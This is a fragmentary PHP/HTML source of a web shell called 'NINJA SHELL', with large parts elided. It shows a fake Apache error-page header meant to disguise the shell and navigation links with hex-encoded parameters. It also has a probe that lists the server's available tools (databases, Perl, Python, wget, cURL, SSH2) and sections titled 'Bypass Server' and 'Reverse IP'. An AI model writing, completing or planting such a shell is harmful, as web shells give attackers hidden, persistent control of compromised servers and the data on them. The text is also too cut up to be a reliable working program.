...
<address>Apache Server at <?= $_SERVER['HTTP_HOST']?> Port 80</address>
    <style>
        input { margin:0;background-color:#fff;border:1px solid #fff;text-align: center; }
    </style>
	<br><br><br><br><br>
...
<!DOCTYPE html>
	...
	font-size: 13px;
				...
				<div class="container">
					<br><br>
					<div class="y x">
					<a href="?" class="ajx"><font color = "black">NINJA SHELL</font></a>
					</div>
            ...
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item active">
                      <a class="nav-link ajx" href="?"><font color="red">Home</font></a>
                    </li>
                     <li class="nav-item active">
                    ...
                    <li class="nav-item active">
                     ...
                     <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('logout') ?>"><font color="red">Logout</font></a>
                    </li>
                </ul>
            </div>
             <a class="navbar-brand" href="#">
	...
	MySQL : '.$mysql.' | MSSQL : '.$mssql.' | PostgreSQL : '.$PostgreSQL.' | Perl : '.$perl.' | Python : '.$python.' | Ruby : '.$ruby.' |  WGET : '.$wget.' | cURL : '.$curl.' | Magic Quotes : '.$magicquotes.' | SSH2 : '.$ssh2.' | Oracle : '.$oracle.' 
...
<center/><br/><hr><h2>Bypass Server Ninja Shell</h2><br>
<?php
print'
    ...
    ";
        ...
        echo '</table><hr>';
			...
			elseif (isset($_GET[hex('reverse-ip')])) {
					...
					?>
<br><hr>
<center><h2>Reverse IP Ninja Shell</h2>
